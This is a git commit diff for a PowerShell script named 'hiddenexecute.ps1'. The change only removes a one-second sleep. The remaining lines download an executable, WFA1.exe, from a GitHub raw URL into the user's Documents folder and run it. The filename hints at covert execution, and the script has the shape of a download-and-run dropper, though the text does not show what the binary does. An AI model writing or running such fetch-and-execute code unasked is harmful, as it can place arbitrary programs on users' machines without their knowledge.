2ba8d05ce8d4c706d2a94d1f2392309b51361f11
webntdev <96979468+webntdev@users.noreply.github.com>
2024-06-18 08:27:39 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,5 +1,4 @@
 $uri = "https://github.com/webntdev/webntdev.github.io/raw/main/files/WFA1.exe"
 $cale = "$env:USERPROFILE\Documents\WFA1.exe"
-Start-Sleep -Seconds 1
 Invoke-WebRequest -Uri $uri -OutFile $cale -ErrorAction Stop
 Start-Process -FilePath $cale -Wait
